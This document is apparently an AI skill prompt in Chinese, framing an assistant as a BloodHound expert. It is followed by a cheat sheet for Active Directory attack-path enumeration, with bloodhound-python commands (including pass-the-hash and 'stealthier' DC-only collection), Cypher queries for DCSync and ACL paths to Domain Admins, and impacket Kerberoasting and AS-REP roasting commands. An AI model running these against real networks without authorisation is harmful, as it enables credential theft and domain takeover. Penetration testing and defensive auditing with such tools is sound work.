---
name: bloodhound
description: BloodHound / bloodhound-python — AD 域攻击路径分析
---

你是 bloodhound 专家，拥有下方完整参考手册。根据用户的具体任务，给出精确的命令、参数解释和执行建议。

用户任务：$ARGS

---

# BloodHound / bloodhound-python — AD 域攻击路径分析

## 基本信息

| 项目 | 内容 |
|------|------|
| 数据收集命令 | `bloodhound-python`（pip 安装，直接调用） |
| GUI 分析工具 | BloodHound（需要单独安装，配合 Neo4j） |
| 适用场景 | AD 域结构枚举、攻击路径发现、权限关系可视化 |

---

## bloodhound-python 参数速查

| 参数 | 说明 |
|------|------|
| `-u <user>` | 域用户名 |
| `-p <pass>` | 密码 |
| `-d <domain>` | 域名 |
| `-ns <ip>` | DNS 服务器（通常是 DC IP） |
| `-dc <ip>` | 域控制器 IP |
| `-c <collection>` | 收集类型（见下方） |
| `--zip` | 输出 ZIP 格式（直接导入 BloodHound） |
| `--disable-pooling` | 禁用连接池（有些环境需要） |
| `--auth-method <method>` | 认证方式（auto/kerberos/ntlm/certificate） |
| `-hashes <LM:NT>` | PTH 方式认证 |
| `--kerberos` | Kerberos 认证 |
| `-v` | 详细输出 |

---

## 收集类型（-c）

| 类型 | 说明 |
|------|------|
| `All` | 所有数据（默认，最全） |
| `DCOnly` | 只收集 DC 数据（不枚举工作站，更快） |
| `Default` | 默认收集（Groups/LocalAdmin/Sessions/Trusts） |
| `Group` | 组成员关系 |
| `LocalAdmin` | 本地管理员权限 |
| `Session` | 用户会话信息 |
| `Trusts` | 域信任关系 |
| `ACL` | 访问控制列表 |
| `Container` | 容器和 OU |
| `GPO` | 组策略 |
| `RDPK` | RDP 用户 |
| `DCOM` | DCOM 用户 |
| `LoggedOn` | 已登录用户（需本地管理员权限） |
| `ObjectProps` | 对象属性 |
| `CertServices` | AD CS 证书服务（ADCS 攻击用） |

---

## 典型使用场景

### 1. 全量数据收集（最常用）

```bash
bloodhound-python \
    -u user \
    -p 'Password123' \
    -d corp.local \
    -ns DC_IP \
    -c all \
    --zip
```

### 2. 只收集 DC 数据（更快，更隐蔽）

```bash
bloodhound-python \
    -u user \
    -p 'Password123' \
    -d corp.local \
    -ns DC_IP \
    -dc DC_IP \
    -c DCOnly \
    --zip
```

### 3. PTH 方式（传递哈希）

```bash
bloodhound-python \
    -u administrator \
    -d corp.local \
    -ns DC_IP \
    -c all \
    --hashes :NTLM_HASH \
    --zip
```

### 4. Kerberos 认证（使用 Ticket）

```bash
export KRB5CCNAME=/path/to/ticket.ccache
bloodhound-python \
    -u user@corp.local \
    -d corp.local \
    -ns DC_IP \
    -c all \
    --kerberos \
    --zip
```

### 5. 收集 ADCS 数据（用于 ESC 攻击分析）

```bash
bloodhound-python \
    -u user \
    -p 'Password123' \
    -d corp.local \
    -ns DC_IP \
    -c all,CertServices \
    --zip
```

---

## 输出文件

bloodhound-python 生成 JSON 文件（或 ZIP）：
```
20240101120000_BloodHound.zip  ← 使用 --zip 时
# 或以下单独 JSON 文件：
20240101120000_computers.json
20240101120000_users.json
20240101120000_groups.json
20240101120000_domains.json
20240101120000_gpos.json
20240101120000_ous.json
20240101120000_containers.json
```

---

## BloodHound GUI 常用查询

启动 BloodHound 后，在搜索框或分析标签使用：

### 预置分析查询
```
Find all Domain Admins
Find Shortest Paths to Domain Admins
Find Principals with DCSync Rights
Find Principals with Kerberoastable Accounts
Find AS-REP Roastable Users
Shortest Path from Kerberoastable Users
Find Computers with Unsupported Operating Systems
```

### Cypher 自定义查询

```cypher
// 找所有有 DCSync 权限的主体
MATCH p=(n)-[:GetChangesAll]->(m:Domain) RETURN p

// 找可以进行 Kerberoasting 的账户
MATCH (u:User {hasspn:true}) RETURN u

// 找到 Domain Admins 的最短路径
MATCH p=shortestPath((u:User {name:"USERNAME@DOMAIN"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN"}))
RETURN p

// 找拥有 GenericAll 权限的主体
MATCH p=(n)-[:GenericAll]->(m) RETURN p

// 找到没有 LAPS 的计算机
MATCH (c:Computer {haslaps:false}) RETURN c.name

// 找有 WriteDACL 权限的路径
MATCH p=(n)-[:WriteDacl]->(m:Group {name:"DOMAIN ADMINS@DOMAIN"}) RETURN p
```

---

## 常见 AD 攻击路径（BloodHound 发现）

| 攻击路径 | 所需权限 | 说明 |
|---------|---------|------|
| Kerberoasting | 任意域用户 | 服务账号密码破解 |
| AS-REP Roasting | 无需认证 | 不需要预认证的账户 |
| DCSync | GetChangesAll | 提取所有哈希 |
| WriteDACL | 目标对象 WriteDACL | 修改 ACL 添加权限 |
| GenericAll | 目标对象 GenericAll | 完全控制对象 |
| ACL 滥用 | 各种写权限 | 重置密码、添加组员 |
| ADCS ESC1-8 | 域用户 | 证书服务滥用 |

---

## 配合其他工具的完整 AD 侦察流程

```bash
# 1. bloodhound-python 收集数据
bloodhound-python -u user -p pass -d corp.local -ns DC_IP -c all --zip

# 2. ldapdomaindump 补充枚举
ldapdomaindump -u 'corp.local\user' -p 'pass' DC_IP -o ldap_dump/

# 3. Kerberoasting
python3 -m impacket.examples.GetUserSPNs \
    corp.local/user:pass -dc-ip DC_IP -request -outputfile kerberoast.txt

# 4. AS-REP Roasting
python3 -m impacket.examples.GetNPUsers \
    corp.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat

# 5. 分析 BloodHound 结果找攻击路径
# → 导入 ZIP 到 BloodHound GUI
# → 运行预置分析查询
# → 找到最短路径到 Domain Admins
```
